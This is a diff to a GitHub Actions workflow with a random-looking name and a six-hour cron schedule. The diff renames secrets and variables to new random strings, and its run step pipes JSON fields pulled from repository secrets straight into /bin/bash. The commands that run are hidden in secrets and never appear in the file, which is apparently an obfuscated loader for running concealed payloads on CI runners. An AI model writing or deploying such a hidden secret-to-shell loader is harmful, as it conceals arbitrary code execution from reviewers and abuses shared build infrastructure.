@@ -1,10 +1,8 @@
 name: guotuobei5748
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 4/6 * * *'
-
+    - cron: '22 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +10,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: guotuobei5748
         env:
-          ldos198: ${{ secrets.ldos198 }}
+          wqyx21: ${{ secrets.wqyx21 }}
         run: |
-          echo $ldos198 | jq -r .y34252 | /bin/bash
-          echo $asqfy428 | jq -r .rylw79419 | /bin/bash
-          echo $i91 | jq -r .txrrx235 | /bin/bash
-          echo $z3957 | jq -r .qceqe60912 | /bin/bash
-          echo $xubsj7 | jq -r .ygwrm0466 | /bin/bash
+          echo $wqyx21 | jq -r .kozhx6276 | /bin/bash
+          echo $vtqgq01 | jq -r .thor813 | /bin/bash
+          echo $fn4 | jq -r .kqvuq0850 | /bin/bash
+          echo $l78 | jq -r .trq56021 | /bin/bash
+          echo $wvj6944 | jq -r .vto9 | /bin/bash
+          echo $yldx93 | jq -r .nnlt2750 | /bin/bash
+          echo $skjh4229 | jq -r .bvxll4422 | /bin/bash
 
